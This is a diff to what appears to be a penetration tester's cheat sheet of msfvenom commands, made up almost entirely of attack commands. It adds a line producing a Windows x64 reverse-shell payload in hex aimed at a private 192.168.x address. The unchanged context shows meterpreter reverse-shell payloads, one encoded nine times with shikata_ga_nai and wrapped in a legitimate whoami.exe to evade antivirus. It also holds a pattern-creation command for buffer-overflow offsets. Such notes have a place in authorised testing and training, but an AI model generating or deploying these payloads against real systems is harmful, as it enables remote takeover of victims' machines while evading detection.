@@ -16,6 +16,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 --arch x86
 # Windows reverse shell with encoding and template from valid exe
 msfvenom -p windows/windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/whoami.exe -o whoami.exe
 
+# Windows reverse shell to hex
+msfvenom -p windows/x64/shell_reverse_tcp -f hex EXITFUNC=thread LHOST=192.168.119.178 LPORT=443
+
 # Create pattern
 msf-pattern_create -l 4379
 
